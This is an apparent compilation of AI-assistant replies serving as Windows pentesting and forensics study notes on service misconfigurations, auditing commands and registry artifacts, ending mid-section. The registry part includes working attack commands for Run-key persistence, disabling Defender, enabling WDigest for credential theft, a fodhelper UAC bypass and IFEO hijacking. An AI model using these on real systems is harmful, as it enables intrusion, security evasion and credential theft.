# **Introduction:**

Windows Services are essential background programs that run independently of user sessions, often starting automatically during the boot process. Misconfigurations in these services are a common attack vector that can lead to arbitrary code execution or privilege escalation, even on fully patched Windows systems.

**What is a Windows Service?**

- A Windows Service is a program that runs in the background without user interaction, similar to UNIX daemons.

- It usually consists of one or more binary files (executables or DLLs).

- Services can be kernel-mode drivers, file system drivers, or user-mode processes.

- Services can start at various boot stages: automatically, manually (demand start), or disabled.

**Types of Windows Services:**

- **Kernel Drivers:** Low-level drivers operating in kernel mode (e.g., HTTP.sys for HTTP protocol stack).

- **User-Mode Services:** Run in their own process or share a process with other services.

- Example service types can be queried using the sc qc \<service_name\> command.

**Examples:**

1.  **Kernel Driver Service:**

C:\Windows\system32\> sc qc http

\[SC\] QueryServiceConfig SUCCESS

SERVICE_NAME: http

TYPE : 1 KERNEL_DRIVER

START_TYPE : 3 DEMAND_START

ERROR_CONTROL : 1 NORMAL

BINARY_PATH_NAME : system32\drivers\HTTP.sys

DISPLAY_NAME : HTTP

- This service runs as a kernel driver and starts on demand.

2.  **User-Mode Service:**

C:\Windows\system32\> sc qc usersvc

\[SC\] QueryServiceConfig SUCCESS

SERVICE_NAME: usersvc

TYPE : 110 WIN32_OWN_PROCESS (interactive)

START_TYPE : 3 DEMAND_START

ERROR_CONTROL : 1 NORMAL

BINARY_PATH_NAME : C:\servicedir\svc.exe

DISPLAY_NAME : UserService

SERVICE_START_NAME : LocalSystem

- This is a standard user-mode service running in its own process under the LocalSystem account.

**Service Control Manager (SCM):**

- The SCM is a core OS component responsible for managing Windows Services.

- It handles starting, stopping, and configuring services and ensures their proper lifecycle management.

------------------------------------------------------------------------

**Summary of Security Considerations:**

- Windows Services run with various privilege levels, sometimes SYSTEM-level, making them high-value targets.

- Misconfigured services, such as those with insecure file permissions, unquoted service paths, or weak service start types, can allow attackers to execute arbitrary code or escalate privileges.

- Proper configuration, monitoring, and patching of services are crucial to maintaining system security.

If you want, I can also explain the typical **workflow of how a Windows Service operates** or dive deeper into common **attack vectors and mitigation strategies** related to Windows Services. Would you like that?

Great! Here’s a detailed explanation of the **typical workflow of a Windows Service** plus common **attack vectors** and **mitigation strategies** related to Windows Services:

**Windows Service Workflow**

1.  **Service Registration:**

    - When a service is installed, its configuration is registered in the Windows Registry under HKLM\SYSTEM\CurrentControlSet\Services.

    - This includes the service name, binary path, start type, dependencies, and account used to run the service.

2.  **Service Control Manager (SCM) Initialization:**

    - At system boot or when a user requests, the SCM reads service configurations and manages their state.

    - Services can be set to start automatically (at boot), manually (on demand), or be disabled.

3.  **Service Start:**

    - SCM launches the service’s executable or loads the driver binary, running it under the configured account (e.g., LocalSystem, NetworkService, or a custom user).

    - The service initializes and enters a running state, ready to perform its functions.

4.  **Service Operation:**

    - The service runs in the background, often without user interaction, performing tasks like handling network connections, managing hardware, or running scheduled jobs.

    - It communicates with the SCM through the Service Control Interface to report status and accept control commands (start, stop, pause, resume).

5.  **Service Stop/Restart:**

    - The SCM can stop or restart services as needed, for example during shutdown or manual intervention.

    - When stopped, the service should release resources and exit gracefully.

Awesome! Here are some **real-world attack examples**, plus **commands and tools** commonly used to audit and test Windows Services for security issues.

------------------------------------------------------------------------

**Real-World Attack Examples on Windows Services**

1.  **Unquoted Service Path Attack**

- **How it works:**\
  A service’s executable path contains spaces but is not enclosed in quotes. When Windows tries to start the service, it parses the path incorrectly and may execute a malicious binary placed earlier in the path.

- **Example:**\
  Service path:

- C:\Program Files\My Service\svc.exe

If unquoted, Windows tries to run:

- C:\Program.exe (if it exists),

- then C:\Program Files\My.exe, etc.

<!-- -->

- **Attack:**\
  Attacker places a malicious executable as C:\Program.exe. When the service starts, the malicious executable runs with the service’s privileges.

2.  **Weak File Permissions on Service Executable**

- If svc.exe or its folder is writable by a low-privileged user, the attacker can replace or modify the executable.

- When the service starts/restarts, attacker’s code runs with elevated privileges.

3.  **DLL Hijacking**

- Some services load DLLs without full paths or from working directories.

- Attacker places a malicious DLL in a directory where the service searches first.

- Service loads the malicious DLL, leading to code execution.

**Useful Commands to Audit Windows Services**

1.  **Query service configuration**

sc qc \<service_name\>

- Shows binary path, service type, start type, and account used.

2.  **List all services with binary paths**

Get-WmiObject win32_service \| Select-Object Name, PathName, StartMode, State, StartName

- Gives an overview of services and their executable paths.

3.  **Check for unquoted service paths**

Get-WmiObject win32_service \| Where-Object { \$\_.PathName -and \$\_.PathName -notmatch '^".\*"\$' -and \$\_.PathName -match '\s' } \| Select-Object Name, PathName

- Lists services where the path has spaces but is not quoted.

4.  **Check permissions on service executable**

- Use icacls to check permissions:

icacls "C:\Path\To\ServiceExecutable.exe"

**Tools for Windows Service Security Assessment**

- **Sysinternals Autoruns:**

  - Graphically shows services, drivers, and auto-start locations.

  - Useful to detect suspicious or misconfigured services.

- **AccessChk (Sysinternals):**

  - Checks permissions on service executables and registry keys.

  - Example:

- accesschk.exe -uwcqv "C:\Path\To\ServiceExecutable.exe"

- **PowerSploit’s PowerUp module:**

  - Automates detection of common Windows privilege escalation vectors, including unquoted service paths and writable service binaries.

- **Windows Service Security Scanner:**

  - Custom scripts or open-source tools that audit services for common misconfigurations.

------------------------------------------------------------------------

**Example PowerShell Script to Find Risky Services**

\# Find services with unquoted executable paths

\$services = Get-WmiObject win32_service \| Where-Object {

\$\_.PathName -and

\$\_.PathName -match '\s' -and

\$\_.PathName -notmatch '^".\*"\$'

}

\$services \| Select-Object Name, DisplayName, PathName, StartName

------------------------------------------------------------------------

If you want, I can help you write more advanced scripts or walk you through using tools like **Autoruns** or **PowerUp** for deeper service security auditing. Want to go further?

Would you like me to summarize the other parts you mentioned—functions of Windows services, workflow, or attack vectors—next?

Perfect! Here’s a **summary and correction** covering:

1.  **Functions of Windows Services**

2.  **Workflow of Windows Services**

3.  **Common security risks and attack vectors related to services**

**1. Functions of Windows Services**

- **Windows Services** are long-running background processes that do not require user interaction.

- They provide essential functions such as:

  - Managing hardware (e.g., drivers)

  - Running network protocols (e.g., HTTP, DHCP)

  - Supporting applications (e.g., database engines, antivirus)

  - Performing scheduled tasks or monitoring system events

- Services can run under different accounts and with different privilege levels depending on their function and security requirements.

------------------------------------------------------------------------

**2. Workflow of Windows Services**

- **Registration:** When installed, a service is registered in the system registry with its configuration: executable path, account, start mode, dependencies, etc.

- **Service Control Manager (SCM):** The SCM is a core Windows component that manages all services — it starts, stops, pauses, and resumes them as needed.

- **Service Start:** SCM launches the service executable under the configured account, initializes it, and puts it into a running state.

- **Operation:** The service performs its designated functions silently in the background, reporting status to SCM and responding to control commands.

- **Service Stop/Restart:** SCM can stop or restart services gracefully or forcefully, freeing resources and managing dependencies.

------------------------------------------------------------------------

**3. Security Risks and Attack Vectors**

- **Privilege Misconfiguration:** Services running with excessive privileges (e.g., LocalSystem) can be leveraged by attackers to gain full system control if compromised.

- **Unquoted Service Path Vulnerability:** If the service binary path contains spaces and is not quoted, attackers can hijack the path to execute malicious code.

- **Weak File or Registry Permissions:** Writable service executables or registry entries allow attackers to replace binaries or modify configurations.

- **DLL Hijacking:** Services loading DLLs without specifying full paths can be tricked into loading malicious DLLs placed by attackers.

- **Service Dependencies Abuse:** Attackers can alter or replace dependent services to influence behavior or escalate privileges.

------------------------------------------------------------------------

**Summary**

Windows Services play a vital role in system operation and security. Their workflow—from registration to execution—is managed by the SCM, and their privileges depend heavily on the accounts they run under. Improper configurations, especially regarding permissions and service accounts, are common attack vectors leading to privilege escalation and code execution. Following least privilege principles, securing service binaries and paths, and monitoring service configurations are key to maintaining a secure Windows environment.

------------------------------------------------------------------------

Want me to help create a checklist or detailed commands/scripts for auditing Windows Services security?

Sure! Here’s a **corrected and concise summary** of your section on **Auditing Windows Services with a focus on Insecure File System Permissions**, tailored for Windows security and pentesting:

------------------------------------------------------------------------

**2. Auditing Windows Services**

**2.1 Insecure File System Permissions**

**Context:**\
Windows service binaries reside on disk in directories with assigned filesystem permissions. Improperly configured permissions on either the service binary or its parent directory can lead to serious security risks.

------------------------------------------------------------------------

**Common Misconfigurations:**

1.  **Weak Permissions on Service Directory:**

    - The folder containing the service executable may have overly permissive access, often inherited from parent directories.

    - For example, the "Everyone" group having full control ((F)) on the service folder allows any user to modify or replace files.

2.  **Weak Permissions on Service Binary:**

    - The executable itself may have weak permissions, either explicitly set or inherited from the parent directory.

    - This can enable unauthorized users to overwrite the service executable and run arbitrary code in the service’s security context.

------------------------------------------------------------------------

**Typical Causes and Examples:**

- **Multi-user applications** sometimes use the current working directory (instead of user-specific locations like %APPDATA%), requiring relaxed permissions on that directory.

- Installing services directly under system root (e.g., C:\\ without adjusting permissions can unintentionally give regular users write or append access, which can be exploited for privilege escalation.

- Tools like icacls and cacls show these permissions. For instance:

C:\Program Files\> icacls TestService

TestService Everyone:(OI)(CI)(F)

This indicates "Everyone" has full control on the folder, which is insecure.

- Similarly, the service binary itself may show:

C:\Program Files\TestService\> icacls svc.exe

svc.exe Everyone:(I)(F)

The (I) shows inherited permissions, which can be dangerous if the parent folder is insecure.

------------------------------------------------------------------------

**Auditing Workflow:**

1.  **Identify Service Binary Paths:**\
    Use the native Windows command to list all services and their executable paths:

2.  wmic service list config

Or remotely (requires admin access):

wmic /node:target_IP /user:username /password:user_pwd service list config

3.  **Check Permissions:**\
    For each binary path, inspect both the executable file and its parent directory permissions using:

4.  icacls \<path\>

or (older systems)

cacls \<path\>

5.  **Prioritize Checks:**

    - System services typically reside in C:\Windows\System32, which is generally secure with read-only access for users.

    - User-installed services commonly are in C:\Program Files or custom directories — these should be prioritized during auditing, especially those outside system folders.

------------------------------------------------------------------------

**Why This Matters for Pentesting and Security:**

- Overly permissive permissions allow local attackers or users to replace or modify service binaries or DLLs.

- Since services often run with elevated privileges, this can lead to **arbitrary code execution** and **privilege escalation**.

- Historical vulnerabilities (e.g., earlier Symantec pcAnywhere versions) have exploited such misconfigurations.

------------------------------------------------------------------------

**Summary:**\
Auditing Windows services for insecure file system permissions involves enumerating service executable paths, inspecting directory and file permissions for weak or inherited rights, and prioritizing binaries located outside protected system folders. Correct permission settings are critical to prevent attackers from hijacking services to gain elevated access.

------------------------------------------------------------------------

If you want, I can continue with summaries of other Windows Services security auditing topics like unquoted service paths, weak registry permissions, or DLL hijacking. Would you like me to?

Great! Here’s a summarized and corrected continuation on **other common Windows Services misconfigurations and attack vectors** relevant for auditing and pentesting:

------------------------------------------------------------------------

**2.2 Unquoted Service Paths**

**Issue:**\
If a service executable path contains spaces and is **not enclosed in quotes**, Windows may misinterpret it and attempt to execute a malicious file placed by an attacker.

**Example:**\
Service binary path:

C:\Program Files\My Service\service.exe

If stored without quotes like:

C:\Program Files\My Service\service.exe

Windows might try to run:

- C:\Program.exe

- or C:\Program Files\My.exe

**Risk:**\
Attackers can place malicious executables named like the truncated path (e.g., C:\Program.exe) to gain code execution under the service’s privilege.

**Audit:**

- Use PowerShell or wmic to get service binary paths and check if they are properly quoted.

- Look for unquoted paths with spaces.

------------------------------------------------------------------------

**2.3 Weak Registry Permissions**

**Issue:**\
Windows Services configurations are stored in the registry under keys like:

HKLM\SYSTEM\CurrentControlSet\Services\\ServiceName\>

If these registry keys or subkeys have weak permissions (e.g., writable by non-admin users), attackers can:

- Modify service parameters

- Change executable paths to point to malicious binaries

- Alter startup types or dependencies

**Audit:**

- Use tools like Regedit with permission view or PowerShell scripts to check ACLs on service registry keys.

- Ensure only SYSTEM and Admin groups have full control.

------------------------------------------------------------------------

**2.4 DLL Hijacking / DLL Search Order Hijacking**

**Issue:**\
Services that load DLLs without specifying full paths rely on Windows’ DLL search order. If attackers place a malicious DLL with the same name in a higher priority directory (like the service’s working directory), the service will load the attacker’s DLL.

**Risk:**\
This leads to code execution within the context of the vulnerable service.

**Audit:**

- Identify service executables and their DLL dependencies (tools like Process Monitor or dependency walkers help).

- Check the directories and file permissions where DLLs are loaded from.

- Look for writable directories in the DLL search path.

------------------------------------------------------------------------

**2.5 Service Dependencies Abuse**

**Issue:**\
Windows Services can depend on other services. If attackers can modify these dependencies or compromise dependent services, they can escalate privileges or influence service behavior.

**Audit:**

- Check service dependency chains using sc qc \<service\> and PowerShell.

- Verify permissions on dependent services and their binaries.

- Ensure dependency chains do not include insecure or untrusted services.

------------------------------------------------------------------------

**Summary for Pentesters & Auditors**

When auditing Windows Services for security weaknesses, focus on:

- File system permissions on service executables and directories

- Proper quoting of service binary paths

- Registry key permissions related to services

- DLL loading paths and associated directory permissions

- Integrity and permissions of dependent services

Misconfigurations in these areas commonly lead to **arbitrary code execution** and **privilege escalation**, key goals during Windows penetration testing.

------------------------------------------------------------------------

Would you like me to help draft detailed commands or scripts for checking any of these areas?

# Windows Registry

The **Windows Registry** is a powerful part of the OS that attackers often abuse during **compromise and post-exploitation** of a **Windows VM**, including on Azure. Below is a breakdown of **how the registry is used during compromise**, with **examples**, **commands**, and **persistence techniques** relevant to **Azure Windows VM pentesting**.

------------------------------------------------------------------------

**🧠 What is the Windows Registry?**

The registry is a hierarchical database that stores low-level settings for:

- The OS and services

- Applications

- User configurations

- Auto-start entries (used for **persistence**)

------------------------------------------------------------------------

**🎯 Use Cases in Compromising a Windows VM**

**1. 🔐 Persistence (Auto-Start Execution)**

Attackers can modify registry keys to execute payloads on boot or login.

**🧬 Common Run Keys (Userland Persistence)**

\# HKCU - Current User (less privileged)

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Users\User\rev.exe"

\# HKLM - All Users (requires admin)

reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v SystemUpdater /t REG_SZ /d "C:\Windows\system32\backdoor.exe"

These run every time the user logs in. Common for **reverse shells**, **C2 beacons**, etc.

------------------------------------------------------------------------

**2. 🧪 Disable Defender / Security Tools**

**🛑 Turn off Defender via Registry**

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

May trigger alerts in Azure Defender or Microsoft Defender for Endpoint.

------------------------------------------------------------------------

**3. 🕵️ Credential Theft: LSASS & Autologon**

**▪ Enable WDigest (plaintext creds in memory)**

reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

Allows tools like **Mimikatz** to extract cleartext credentials from memory.

**▪ Extract AutoLogon credentials**

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

Look for DefaultUserName, DefaultPassword, AutoAdminLogon.

------------------------------------------------------------------------

**4. 🎭 Privilege Escalation (UAC Bypass)**

Attackers can exploit **UAC bypass techniques** by modifying Registry keys that control how binaries are executed.

**▪ Example: Fodhelper.exe UAC Bypass**

reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "C:\Temp\rev.exe" /f

reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /f

fodhelper.exe

This launches the payload with **auto-elevated privileges**.

------------------------------------------------------------------------

**5. 🧬 DLL Hijacking via App Paths or Image File Execution Options (IFEO)**

**▪ Persistence or Redirection using IFEO:**

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\backdoor.exe"

Launching notepad.exe will execute the attacker's payload instead.

------------------------------------------------------------------------

**6. 📁 Hide Payloads or Data**

Store encoded payloads in the registry to be retrieved later (also known as **fileless persistence**).

**▪ Example (using PowerShell):**

Set-ItemProperty -Path "HKCU:\Software\Microsoft\MyPayload" -Name "Code" -Value "Base64EncodedShellcode"

Later retrieved and decoded for **in-memory execution**.

------------------------------------------------------------------------

**🚩 Detection Considerations in Azure Context**

| **Technique**            | **Defender Detection**           |
|--------------------------|----------------------------------|
| Registry autoruns        | Suspicious Registry Modification |
| Defender disable         | Tamper Protection Alert          |
| IFEO misuse              | Persistence via IFEO             |
| UAC bypass via fodhelper | Known signature — alerts likely  |
| Registry-stored payloads | Rare — harder to detect          |

------------------------------------------------------------------------

**✅ Summary Table**

| **Objective** | **Registry Path/Key** | **Command Example** |
|----|----|----|
| Persistence | HKCU\Software\Microsoft\Windows\CurrentVersion\Run | reg add ... |
| Defender evasion | HKLM\SOFTWARE\Policies\Microsoft\Windows Defender | Disable via reg |
| Credential stealing | HKLM\SYSTEM\\..\WDigest, Winlogon | Enable WDigest |
| UAC bypass | HKCU\Software\Classes\ms-settings\\.. | Fodhelper hack |
| Redirection/IFEO | HKLM\SOFTWARE\\..\Image File Execution Options\binary.exe | Debugger value |
| Fileless payloads | HKCU:\Software\Microsoft\MyPayload | PowerShell encoded |

------------------------------------------------------------------------

Would you like:

- A PowerShell script to automate these registry-based attacks?

- Or a custom lab setup with registry-based persistence and detection in an Azure VM?

**Key Registry Locations for User Activity and Persistence**

- **User Recent Activity & MRU Lists (HKCU - Current User):**

  - HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32

    - LastVisitedPidlMRU — Recently visited folders

    - OpenSavePidlMRU — Recently opened/saved files

  - HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs — Recent documents

  - HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU — Run command history

  - HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths — Typed paths in Explorer address bar

  - HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist — User activity metrics

- **Startup Items:**

  - HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

  - HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

  - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

  - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

- **Shellbags (Track folder view settings):**

  - HKCU\SOFTWARE\Microsoft\Windows\Shell\BagMRU

  - HKCU\SOFTWARE\Microsoft\Windows\Shell\Bags

  - These store folder view history and can be used for timeline reconstruction.

- **User Classes Data (per-user COM settings):**

  - HKCU\SOFTWARE\Classes

  - Corresponds to the file %USERPROFILE%\AppData\Local\Microsoft\Windows\UsrClass.dat

------------------------------------------------------------------------

**USB Device Forensics**

- **USB Device Enumeration:**

  - HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR — USB storage devices enumeration (Vendor, Product, Serial \#)

  - HKLM\SYSTEM\CurrentControlSet\Enum\USB — USB devices

  - HKLM\SOFTWARE\Microsoft\Windows Portable Devices\Devices — Device info including Class ID, Serial \#, VID/PID

- **Volume and Drive Letter Tracking:**

  - HKLM\SYSTEM\MountedDevices

    - Maps USB serial \# to Drive Letters and Volume GUIDs

  - HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\EMDMgmt

    - Present only if system drive is NOT SSD

    - Tracks ReadyBoost data and Volume Serial Numbers for USB devices (in decimal, convert to hex)

    - Useful to track device format history via multiple volume serial numbers per device serial \#

- **Mountpoints:**

  - User-specific mounts found at:

    - NTUSER.DAT\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2

    - Shows user that mounted the USB device

- **USB Timestamps:**

  - First connect, last connect, and removal times are stored under:

    - HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR\Ven_Prod_Version\USB iSerial \#\Properties\\GUID}\\###

      - 0064 = First Install (Win7 / 8)

      - 0066 = Last Connected (Win8+)

      - 0067 = Last Removal (Win8+)

  - Also found in setupapi.log and setupapi.dev.log (XP to Vista+)

  - Search logs for device serial \# to find first time plugged in

- **Tools:**

  - *USBDeviceForensics* by WoanWare automates USB artifact analysis.

------------------------------------------------------------------------

**Miscellaneous Useful Registry Keys**

- **System and Network Info:**

  - HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation — Time zone info

  - HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName — Hostname

  - HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Shares — List of open SMB shares

  - HKLM\SYSTEM\CurrentControlSet\Control\FileSystem

    - Look for NtfsDisableLastAccessUpdate — Usually 0x1 (access timestamps off by default)

  - HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces — Network interface info and IPs

- **Network Location Awareness (NLA) (Vista+):**

  - Aggregates networks and assigns GUIDs for profiles (used by firewall)

  - Keys to check:

    - HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures

      - Unmanaged and Managed network signatures (record gateway MAC, SSID, DNS suffix, GUID)

    - HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles\\GUID} — Profile info with creation and last connected timestamps (stored as 128-bit UTC)

    - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\HomeGroup — Network type and connection times

  - For XP:

    - HKLM\SOFTWARE\Microsoft\WZCSVC\Parameters\Interfaces\\GUID}

      - Last write time indicates last connected time

- **Network Types Codes:**

  - 0x06 = Wired

  - 0x17 = Broadband

  - 0x47 = Wireless

------------------------------------------------------------------------

**File and Prefetch Artifacts**

- **LNK Files (Shortcuts):**

  - C:\Users\username\AppData\Roaming\Microsoft\Windows\Recent

  - Use tools like *TZWorks lp.exe* for analysis

- **Jump Lists (Enhanced LNK files):**

  - Locations:

    - C:\Users\username\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations

    - C:\Users\username\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations

  - Use *TZWorks jmp.exe* for parsing

  - Jump Lists embed LNK files in a database structure

- **Prefetch & SuperFetch:**

  - Prefetch: Introduced in Windows XP to speed up app launches by caching file access patterns

  - SuperFetch & ReadyBoost: Added/enhanced in Vista+ for improved performance, using RAM and USB drives

  - Prefetch files stored at C:\Windows\Prefetch\\

    - Filename format: EXENAME-HASH.pf

    - Hash is based on the full path of executable (e.g., CALC.EXE-AC08706A.pf)

  - Registry settings at:

    - HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters

      - EnablePrefetcher values:

        - 0 = Disabled

        - 1 = Application prefetching only

        - 2 = Boot prefetching only

        - 3 = Both application and boot prefetching (default)

- **Disk Defragmenter:**

  - Scheduled every 3 days by Task Scheduler

  - Uses Layout.ini (from prefetch data) to optimize file layout on HDD

**Windows & Active Directory Penetration Testing: Windows Registry Focus**

**Overview**

The Windows Registry is a hierarchical database storing low-level OS and application configuration. Attackers and pentesters leverage it to:

- Discover user activity and system configurations

- Identify persistence mechanisms

- Find artifacts of USB device usage

- Enumerate network and share configurations

- Detect forensic evidence

- Perform lateral movement or persistence via autostart entries

------------------------------------------------------------------------

**Tactics, Techniques, and Strategies (TTPs)**

**1. Reconnaissance & Evidence Gathering**

- Enumerate user activity and history (MRU lists, typed paths)

- Identify mounted USB devices and their history for data exfiltration or artifact analysis

- Extract network connection history and interface configurations

- Examine shared resources and open shares on hosts

**2. Persistence & Privilege Escalation**

- Search and manipulate Run/RunOnce keys for autostart persistence

- Abuse shellbags and UserAssist keys for stealth persistence

- Use USB device serial and mount history to track removable media usage

**3. Lateral Movement & Reconnaissance**

- Enumerate shares and network interfaces

- Map firewall profiles and network locations (NLA keys)

- Identify recently accessed networks and domain join status

------------------------------------------------------------------------

**Key Registry Paths & Their Purpose**

| **Registry Path** | **Purpose/Info** |
|----|----|
| HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32 | Most Recently Used (MRU) lists like LastVisitedPidlMRU |
| HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs | Recent documents accessed |
| HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run and RunOnce | Autostart programs for persistence |
| HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run and RunOnce | System-wide autostart programs |
| HKCU\SOFTWARE\Microsoft\Windows\Shell\BagMRU and Bags | Shellbags, file explorer navigation artifacts |
| HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR | USB storage devices enumeration and serial numbers |
| HKLM\SYSTEM\MountedDevices | Maps volume GUIDs and drive letters to USB devices |
| HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares | Lists active SMB shares |
| HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces | Network interface IP configurations |
| HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles | Network Location Awareness (NLA) profiles & last connection times |
| HKLM\SYSTEM\CurrentControlSet\Control\FileSystem | Check if NTFS last access timestamps are enabled/disabled |

------------------------------------------------------------------------

**Vulnerabilities & Security Risks**

| **Risk Category** | **Description** | **Severity** | **Impact on Workload** |
|----|----|----|----|
| Persistence Abuse | Malicious entries in Run/RunOnce keys for stealthy malware persistence | High | Compromise of system integrity |
| USB Device Forensics | Sensitive info leak through USB device history and serial tracking | Medium | Data leakage or tracing attacker presence |
| Network Reconnaissance | Extraction of firewall profiles and network interface details | Medium | Enables lateral movement and reconnaissance |
| File System Artifacts | Abusing shellbags and UserAssist for stealthy persistence or evidence | Medium | Difficult detection, forensic evasion |
| Open Shares Exposure | Enumeration of open shares could reveal attack vectors or data exposure | High | Potential lateral movement and data exfiltration |

**Tools Used**

- **Reg.exe / PowerShell** – Native tools to query registry.

- **USBDeviceForensics (WoanWare)** – Automates USB device history extraction.

- **TZWorks lp.exe & jmp.exe** – Utilities for LNK and Jump List file analysis.

- **Sysinternals Autoruns** – Detects persistence locations.

- **Registry Explorer** – For detailed forensic registry analysis.

- **Windows Event Logs** – To complement registry findings.

------------------------------------------------------------------------

**Step-by-Step Commands & Techniques**

**1. Enumerate MRU (Most Recently Used) Lists and User Activity**

\# List LastVisitedPidlMRU keys (Explorer recent locations)

reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU"

\# List recently opened documents

reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"

\# View typed paths

reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"

\# UserAssist keys (encoded ROT13, requires decoding)

reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"

------------------------------------------------------------------------

**2. Enumerate Persistence Entries**

\# Current user Run keys

reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

\# Local machine Run keys (system-wide)

reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

------------------------------------------------------------------------

**3. USB Device Enumeration and History**

\# Enumerate USB devices and serial numbers

reg query "HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR"

\# Check mounted devices and associated volume GUIDs

reg query "HKLM\SYSTEM\MountedDevices"

\# Identify users who mounted devices (NTUSER.DAT)

reg query "HKU\\SID\>\Software\Microsoft\Windows\CurrentVersion\Explorer\Mountpoints2"

\# Check USB connection logs in setupapi logs (Windows 7/8)

Get-Content C:\Windows\inf\setupapi.dev.log \| Select-String "\<USB Serial#\>"

------------------------------------------------------------------------

**4. Network and Shares Enumeration**

\# List open shares on system

reg query "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares"

\# List network interfaces and IP config

reg query "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces"

\# Network Location Awareness profiles (Vista+)

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles"

\# Firewall profile info related to network location awareness

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures"

------------------------------------------------------------------------

**5. Prefetch & Jump Lists (Program Execution History)**

\# View prefetch files in directory

Get-ChildItem C:\Windows\Prefetch\\

\# Analyze jump lists using TZWorks utilities (lp.exe and jmp.exe)

\# (Run lp.exe or jmp.exe pointing to Recent or AutomaticDestinations folder)

------------------------------------------------------------------------

**Summary and Recommendations**

- **Regularly monitor and audit autostart keys** to detect unauthorized persistence.

- **Disable or monitor USB device usage** on sensitive systems to prevent data leakage.

- **Leverage USB device forensic analysis** to track potential data exfiltration and attacker footprint.

- **Limit and monitor open shares** to reduce lateral movement risk.

- **Review network profiles and firewall rules** to detect anomalous connections or unauthorized network access.

- **Use forensic tools to analyze UserAssist, Shellbags, Prefetch, and Jump Lists** for deeper user activity insights.

- Harden systems by enabling **NTFS last access timestamps** to improve forensic accuracy.

------------------------------------------------------------------------

If you'd like, I can provide an automated PowerShell script or a detailed pentest playbook covering these registry-related checks and exploitation techniques as well. Just ask!

Sure! Here's a clean, corrected, and summarized version of your **Windows Registry Forensic Analysis** notes:

------------------------------------------------------------------------

**Windows Registry Forensic Analysis Summary**

**1. Account and System Information**

- **OS Version:**\
  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion

- **Current Control Set:**\
  HKLM\SYSTEM\CurrentControlSet\
  HKLM\SYSTEM\Select\Current\
  HKLM\SYSTEM\Select\LastKnownGood

- **Computer Name:**\
  HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName

- **Time Zone Information:**\
  HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation

**2. Network Interfaces and Past Networks**

- HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces

**3. Autostart Programs**

- User-specific:\
  NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run\
  NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce

- System-wide:\
  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\
  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

**4. SAM Hive (User Accounts)**

